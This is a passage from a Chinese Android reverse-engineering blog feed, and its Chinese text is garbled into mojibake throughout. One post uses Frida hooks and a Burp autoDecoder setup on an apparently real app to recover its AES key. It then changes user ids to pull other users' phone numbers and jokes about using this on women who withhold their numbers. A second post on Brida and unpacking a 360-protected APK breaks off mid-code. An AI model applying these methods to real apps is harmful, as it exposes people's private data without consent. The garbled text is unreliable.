punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesDecrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesDecrypt</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">parseNetworkResponse</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">17</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre></li>æˆ‘ä»¬å‘ç°äº†ä¸€å †com.android.volley.toolbox åå­—çŒœæµ‹æœ‰å¯èƒ½æ˜¯å‘åŒ…ç”¨çš„ ç™¾åº¦æœç´¢ä¸€ä¸‹<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161136052.png" alt="æœç„¶æ˜¯å‘åŒ…çš„"><br>éšä¾¿æœç´¢ä¸€ä¸ªçœ‹çœ‹å†…ç½®æ¡†æ¶æ²¡åŠæ³•çœ‹æºç äºæ˜¯çœ‹çœ‹åŒ…æœ‰ä»€ä¹ˆç‰¹ç‚¹å‘ç°è¿™é‡ŒPort&#x3D;PhoneLogin&amp;CheckCode&#x3D;0000000000;6.08.2.0;android;0;0 ä¸å˜æœç´¢ä¸€æ³¢<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161142613.png" alt="ç¬é—´æŸ³æš—èŠ±æ˜"><br>éšä¾¿ç‚¹ä¸€ä¸ªå‡½æ•°ã€‚çœ‹åˆ°super ä¸€çœ‹ç»§æ‰¿StringRequestç‚¹ä¸€ä¸‹çœ‹çœ‹å‘ç°ç‚¹ä¸åŠ¨ã€‚çœ‹çœ‹è¿™åŒ…åã€‚import com.android.volley.toolbox.StringRequest;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161143500.png" alt="çªç ´ç‚¹"><br>ç™¾åº¦ä¸€ä¸‹import com.android.volley.toolbox.StringRequest; å¦‚ä½•å‘åŒ…ä¸å°±è¡Œäº†<a href="https://blog.csdn.net/nuli888/article/details/52169679">https://blog.csdn.net/nuli888/article/details/52169679</a></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">*</span> <span class="token annotation punctuation">@param</span> path   è¯·æ±‚è·¯å¾„     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> map    è¯·æ±‚å‚æ•°     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> entity éœ€è¦è§£æçš„ç±»     <span class="token operator">*</span> <span class="token annotation punctuation">@return</span>     <span class="token operator">*</span><span class="token operator">/</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">StringRequest_POST</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Handler</span> handler<span class="token punctuation">,</span> <span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> entity<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token operator">*</span> getè¯·æ±‚     <span class="token operator">*</span>     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> path   è¯·æ±‚è·¯å¾„     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> entity éœ€è¦è§£æçš„ç±»     <span class="token operator">*</span> <span class="token annotation punctuation">@return</span>     <span class="token operator">*</span><span class="token operator">/</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">StringRequest_GET</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Handler</span> handler<span class="token punctuation">,</span> <span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> entity<span class="token punctuation">)</span> è°ƒç”¨<span class="token class-name">StringRequest</span> request_post <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringRequest</span><span class="token punctuation">(</span><span class="token class-name">Request<span class="token punctuation">.</span>Method</span><span class="token punctuation">.</span>POST<span class="token punctuation">,</span>                path<span class="token punctuation">,</span> succes<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></code></pre><p>å¯ä»¥çœ‹å‡ºç¬¬äºŒä¸ªå‚æ•°æ˜¯è¯·æ±‚url ï¼Œå¦‚æœæ˜¯postç¬¬ä¸‰ä¸ªæ˜¯å‚æ•°çš„key å’Œvalue</p></ul><h2 id="ç¼–å†™frida-hookè„šæœ¬"><a href="#ç¼–å†™frida-hookè„šæœ¬" class="headerlink" title="ç¼–å†™frida hookè„šæœ¬"></a>ç¼–å†™frida hookè„šæœ¬</h2><ul><li>fridaç¼–å†™è„šæœ¬æç¤ºä¿¡æ¯</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161154809.png"></p><pre class="language-python" data-language="python"><code class="language-python">Error<span class="token punctuation">:</span> StringRequest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> has more than one overload<span class="token punctuation">,</span> use <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token operator">&lt;</span>signature<span class="token operator">></span><span class="token punctuation">)</span> to choose <span class="token keyword">from</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$Listener'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$ErrorListener'</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token string">'int'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$Listener'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$ErrorListener'</span><span class="token punctuation">)</span>    at X <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">563</span><span class="token punctuation">)</span>    at K <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">558</span><span class="token punctuation">)</span>    at <span class="token builtin">set</span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">926</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">/</span>stringRequest<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span>vm<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">)</span>    at _performPendingVmOps <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">238</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">213</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span>vm<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">)</span>    at _performPendingVmOpsWhenReady <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">232</span><span class="token punctuation">)</span>    at perform <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">192</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span><span class="token builtin">eval</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">/</span>stringRequest<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">)</span></code></pre><p>çœ‹è¿™ä¸ªæ¯”è¾ƒåƒ â€˜intâ€™, â€˜java.lang.String hookä¸€ä¸‹  è¿™æ ·æˆ‘ä»¬å¯ä»¥è·å–åˆ°ä»»æ„url,è‡³äºè¯·æ±‚æ•°æ®çš„è¯ç›´æ¥è·å–å¯†é’¥è§£å¯†å°±å®Œäº‹äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161443194.png" alt="è¯´æ˜æ²¡æœ‰é—®é¢˜"><br>æœç´¢ä¸€ä¸‹è§£å¯†çš„å†…å®¹ç›´æ¥å®šä½<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161501655.png" alt="ç»„åŒ…å…³é”®å‡½æ•°"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161458220.png" alt="è§£å¯†å†…å®¹"></p><p>è¿™ä¼šå„¿è¯·æ±‚çš„urlæœ‰äº†è¿”å›çš„ç›´æ¥hook aesè§£å¯†ç®—æ³•å°±è¡Œäº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161512794.png" alt="è„šæœ¬"></p></ul><h2 id="ä½¿ç”¨è„šæœ¬åˆ†æç™»é™†ä»¥åçš„æ“ä½œ"><a href="#ä½¿ç”¨è„šæœ¬åˆ†æç™»é™†ä»¥åçš„æ“ä½œ" class="headerlink" title="ä½¿ç”¨è„šæœ¬åˆ†æç™»é™†ä»¥åçš„æ“ä½œ"></a>ä½¿ç”¨è„šæœ¬åˆ†æç™»é™†ä»¥åçš„æ“ä½œ</h2><ul>ä¸‹å›¾æ˜¾ç¤ºç™»é™†æˆåŠŸäº†è¿”å›çš„æ•°æ®ã€‚<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161516834.png" alt="è„šæœ¬è¿è¡Œæˆªå›¾"></p><li> çœ‹ä¸ªç™»é™†ä»¥åè¿”å›ä»€ä¹ˆåœ¨çœ‹ä¸ªäººä¿¡æ¯é‚£é‡Œæ˜æ–‡è¯·æ±‚æ˜¯ä»€ä¹ˆ</li>ç™»é™†ç”»çº¢æ¡†çš„memberidå°±æ˜¯ç™»é™†è€…çš„idå¥½ portpassword æ˜¯åŠ¨æ€aesçš„ç§˜é’¥<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161520160.png" alt="ç™»é™†è¿”å›"></p><p>åœ¨çœ‹ä¸ªäººä¿¡æ¯é‚£åˆ†æåŒ…ä»¥åç”¨hookæ–¹å¼å‘ç°ç”¨çš„æ˜¯AES&#x2F;ECB&#x2F;PKCS5Padding  é‡‡ç”¨çš„åŠ¨æ€ç§˜é’¥æ–¹å¼ ç™»é™†æˆåŠŸä»¥åç»™ä½ ä¸€ä¸ªåŠ¨æ€keyã€‚æ‰€æœ‰è¯·æ±‚ç”¨è¿™ä¸ªkeyè¿›è¡ŒåŠ å¯†å“åº”ä¹Ÿæ˜¯ç”¨è¿™ä¸ªè¿›è¡Œè§£å¯†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161613870.png" alt="ç›´æ¥ç”¨ç§˜é’¥è§£å¯†è¯·æ±‚æˆåŠŸè§£å¯†"></p></ul><h2 id="é…ç½®bpæ’ä»¶autodecoderæµ‹è¯•"><a href="#é…ç½®bpæ’ä»¶autodecoderæµ‹è¯•" class="headerlink" title="é…ç½®bpæ’ä»¶autodecoderæµ‹è¯•"></a>é…ç½®bpæ’ä»¶autodecoderæµ‹è¯•</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161630479.png" alt="autodecoderé…ç½®"><br>Charles è½¬å‘è¯·æ±‚åˆ°bp,ç›´æ¥ä¿®æ”¹idå°±å¯ä»¥è·å–åˆ°é“­æ„Ÿä¿¡æ¯<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161640801.png" alt="ä¿¡æ¯ä¸€"><br>æ‰‹æœºå·ä¿¡æ¯,è‡³æ­¤æ­¤appåªè¦ç»‘å®šæ‰‹æœºå·åªè¦çŸ¥é“å¯¹æ–¹idå·å°±å¯ä»¥è·å–æ‰‹æœºå·ç <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161641386.png" alt="ä¿¡æ¯äºŒ"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ­¤appé‡‡ç”¨çš„åŠ¨æ€ç§˜é’¥æ–¹å¼ ç™»é™†æˆåŠŸä»¥åç»™ä½ ä¸€ä¸ªåŠ¨æ€keyã€‚AES&#x2F;ECB&#x2F;PKCS5Padding æ‰€æœ‰è¯·æ±‚ç”¨è¿™ä¸ªkeyè¿›è¡ŒåŠ å¯†å“åº”ä¹Ÿæ˜¯ç”¨è¿™ä¸ªè¿›è¡Œè§£å¯†ã€‚å…³æ³¨é¢‘é“åç»­è¿˜ä¼šå¸¦æ¥ç²¾å½©çš„å®æˆ˜å†…å®¹ã€‚å’Œå°å§å§èŠå¤©ä¸ç»™æ‰‹æœºå·æ€ä¹ˆåŠæä»–(å‰ææ˜¯æœ‰æ¼æ´å“ˆå“ˆå“ˆ)</p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> autoDecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰å“è‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•å·¥å…·Brida-å®æˆ˜æ¼”ç¤ºæŸèŠå¤©app</title>
      <link href="/androidreverse/2023/03/articles/4a73c3959963b967/"/>
      <url>/androidreverse/2023/03/articles/4a73c3959963b967/</url>
      
        <content type="html"><![CDATA[<h2 id="Bridaä»‹ç»"><a href="#Bridaä»‹ç»" class="headerlink" title="Bridaä»‹ç»"></a>Bridaä»‹ç»</h2><ul><li>å®˜æ–¹è§£é‡Š:Brida æ˜¯ Burp Suite æ‰©å±•ï¼Œå®ƒä½œä¸º Burp Suite å’Œ Frida ä¹‹é—´çš„æ¡¥æ¢ï¼Œå¯ä»¥åœ¨ç¯¡æ”¹åº”ç”¨ç¨‹åºä¸åç«¯æœåŠ¡/æœåŠ¡å™¨ä¹‹é—´äº¤æ¢çš„æµé‡çš„åŒæ—¶ä½¿ç”¨å’Œæ“ä½œåº”ç”¨ç¨‹åºè‡ªå·±çš„æ–¹æ³•ã€‚å®ƒæ”¯æŒ Frida æ”¯æŒçš„æ‰€æœ‰å¹³å°ï¼ˆWindowsã€macOSã€Linuxã€iOSã€Android å’Œ QNXï¼‰ã€‚<br/>https://github.com/federicodotta/Brida <br/>https://github.com/vichhika/Brida  <br/><p>è‡ªå·±ç†è§£:brida å¯ä»¥ç›´æ¥å’Œfrida serveré…åˆ ã€‚bridaé€šè¿‡frida serverå¯¹appè¿›è¡Œspwnæˆ–è€…attachã€‚å°†bridaçš„jsè„šæœ¬é€šè¿‡frida-serveræ³¨å…¥appå†…ã€‚ç„¶åé€šè¿‡RPCä¸»åŠ¨è°ƒç”¨æ–¹å¼å¯¹è¯·æ±‚æ˜æ–‡è¿›è¡Œè‡ªåŠ¨åŠ å¯†æˆ–è€…è‡ªåŠ¨è§£å¯†ã€‚å‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ã€‚è§£å¯†ç„¶åå“åº”æ–¹å¼åŠ å¯†æ•°æ®å‘é€ç»™bridaã€‚brida é€šè¿‡ä¸»åŠ¨è°ƒç”¨æ¥æ”¶ç›´æ¥å¯¹åŠ å¯†æ•°æ®è¿›è¡Œè§£å¯†ã€‚ä»è€Œè¾¾åˆ°è‡ªåŠ¨åŒ–æµ‹è¯•çš„ç›®çš„ã€‚</p></li></ul><h2 id="Bridaç¯å¢ƒå®‰è£…"><a href="#Bridaç¯å¢ƒå®‰è£…" class="headerlink" title="Bridaç¯å¢ƒå®‰è£…"></a>Bridaç¯å¢ƒå®‰è£…</h2><ul><li>å®‰è£…çš„ç¯å¢ƒå‚è€ƒhttps://www.bilibili.com/video/av332313470/   ä¸åœ¨è¿‡å¤šä»‹ç»ã€‚è¿™é‡Œæˆ‘ç”¨çš„pythonç¯å¢ƒæ˜¯python3</li></ul><h2 id="appè¿›è¡Œåˆ†æ"><a href="#appè¿›è¡Œåˆ†æ" class="headerlink" title="appè¿›è¡Œåˆ†æ"></a>appè¿›è¡Œåˆ†æ</h2><ul><li>ä½¿ç”¨jadxè¿›è¡Œåç¼–çœ‹çœ‹è¿™ä¸ªapk</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032006200.png" alt="çœ‹åˆ°qihooç»å¯¹360åŠ å›º"></p><li>360åŠ å›ºåº”è¯¥æ˜¯æ•´ä½“åŠ å›ºã€‚</li><li>è„±æ•´ä½“åŠ å›ºçš„å·¥å…·æœ‰frida-dexdump(pythonç¼–å†™å¯ä»¥å•ç‹¬ä½¿ç”¨å¯ä»¥é…åˆobjection),blackDex(å°±æ˜¯ä¸€ä¸ªappç›´æ¥å®‰è£…å°±è¡Œäº†)ã€‚ç­‰å·¥å…·æˆ‘è§‰å¾—è¿™ä¸ªä¸¤ä¸ªå·¥å…·æœ€å¥½ç”¨ã€‚å·¥å…·ç™¾åº¦æˆ–è€…githubå»æœç´¢</li><li>è¿™é‡Œæˆ‘ä½¿ç”¨blackDexè¿›è¡Œè„±å£³</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032014948.png" alt="é€‰æ‹©ç›®æ ‡appç‚¹å‡»è¿›è¡Œè„±å£³"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032014057.png" alt="è„±å£³æˆåŠŸ"></p><li>åˆ©ç”¨adb pullå‘½ä»¤æ‹‰ä¸‹æ¥ã€‚æŠŠæ‰“åŒ…çš„dexæ–‡ä»¶å‹ç¼©æˆzipæ–‡ä»¶ç„¶åæ”¾åˆ°jadxé‡Œé¢å³å¯</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032017012.png" alt="è„±å£³æˆåŠŸå¯¼å…¥jdaxé‡Œé¢"></p><li>æ¥ä¸‹æ¥æ‰“å¼€posternå’ŒCharleså¯¹è½¯ä»¶è¿›è¡ŒæŠ“åŒ…</li><li>åˆšæ‰“å¼€æ‰‹æœºå‘ç°æç¤ºroot,æˆ‘ä»¬é€šè¿‡æˆªå›¾å¯ä»¥çœ‹åˆ°æ˜¯toastæ–¹æ³•è¿™æ˜¯ä¸€ä¸ªå®šä½ç‚¹</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032021125.png" alt="æˆªå›¾ååº”æ˜¯toastæ ‡è¯†"></p><li>ç„¶åæˆ‘ä»¬ç‚¹å‡»è´¦å·ç™»é™†éšä¾¿è¾“å…¥è¿›è¡ŒæŠ“åŒ…ã€‚è¿™ä¸ªæ²¡æœ‰æ£€æµ‹ä»£ç†ä¹Ÿæ²¡æœ‰æ£€æµ‹vpnå¯ä»¥ç›´æ¥æŠ“å¹¶ä¸”æ˜¯httpåè®®æ‰€ä»¥ä¸å­˜åœ¨ä»€ä¹ˆè¯ä¹¦åŒå‘éªŒè¯ç­‰é—®é¢˜ã€‚å¼€æ</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032026906.png" alt="åˆ’çº¢è‰²çš„å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032028542.png" alt="è¯·æ±‚å’Œå“åº”éƒ½åŠ å¯†"></p><li>æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªparam=æˆ‘ä»¬å»æºä»£ç é‡Œé¢æœç´ ä¸€ä¸‹å‘ç°éƒ½æ˜¯å…³è”çš„d.c.a.k.r.c å‡½æ•°</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032033658.png" alt="æœç´ åˆ°ä¸å°‘"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032035608.png" alt="è¿™ä¸ªucå‡½æ•°ä¼°è®¡æ˜¯å°±æ˜¯åŠ å¯†è§£å¯†é€»è¾‘"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032037359.png" alt="ç¡®å®šåŠ å¯†è§£å¯†å‡½æ•°"></p><li>çœ‹ä»£ç æ˜¯RSAçš„åŠ å¯†æ–¹å¼ä¸è¿‡ä»–è¿™å’Œæ™®é€šçš„å¥½åƒä¸å¤ªä¸€æ ·æœ‰ä¸€ä¸ªbå‡½æ•°å®ç°åŠ å¯†è§£å¯†é€»è¾‘</li><li>æ ¸å¿ƒåŠ å¯†ç®—æ³•ä»£ç å¦‚ä¸‹:</li><li><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">d<span class="token punctuation">.</span>c<span class="token punctuation">.</span>a<span class="token punctuation">.</span>k</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">NoSuchAlgorithmException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>interfaces<span class="token punctuation">.</span></span><span class="token class-name">RSAPublicKey</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">InvalidKeySpecException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span><span class="token punctuation">;</span><span class="token comment">/* compiled from: U.java */</span><span class="token 